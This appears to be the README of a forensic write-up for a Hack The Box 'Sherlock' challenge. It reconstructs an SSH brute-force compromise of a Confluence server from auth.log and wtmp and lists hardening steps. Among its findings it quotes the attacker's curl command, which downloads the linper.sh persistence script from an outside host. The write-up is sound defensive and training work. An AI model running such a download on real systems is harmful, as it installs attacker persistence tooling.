Sherlock — SSH / auth.log & wtmp Analysis
Overview

This project analyzes the auth.log and wtmp artifacts from the HTB sherlock challenge to investigate an SSH brute-force compromise against a Confluence server. The investigation included:

Identifying the brute-force source IP and confirming successful authentication.

Correlating auth.log events with wtmp records (using utmp.py) to determine when an interactive terminal session was established and its session number.

Tracing post-exploitation activity: creation of a backdoor user and evidence of privileged commands used to download an external script.

Producing a clear timeline, sanitized evidence, and recommendations for remediation.

Key findings (short)

Attacker IP: 65.2.161.68

Compromised user: root

Interactive login (UTC): 2024-03-06 06:32:45

Session number: 37

Backdoor account: cyberjunkie (MITRE: T1136.001)

Observed privileged download: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

Importance to cybersecurity

Logs such as auth.log and wtmp are critical sources for incident detection and forensic reconstruction. By correlating authentication events with session records and command evidence, defenders can:

Determine how attackers gained initial access and what actions followed the compromise.

Identify persistence mechanisms (e.g., new accounts) and remove them before further damage.

Recommend concrete hardening steps (disable root SSH, enforce key-based authentication, enable rate-limiting and 2FA) to reduce future risk.

This exercise demonstrates practical skills in log analysis, timeline building, and evidence sanitization — all core capabilities for defenders, incident responders, and forensic analysts.

Usage

The repository includes sanitized logs, utmp.py and writeup.md. These can be used to reproduce the analysis:

Parse wtmp with last -f wtmp or python utmp.py wtmp.

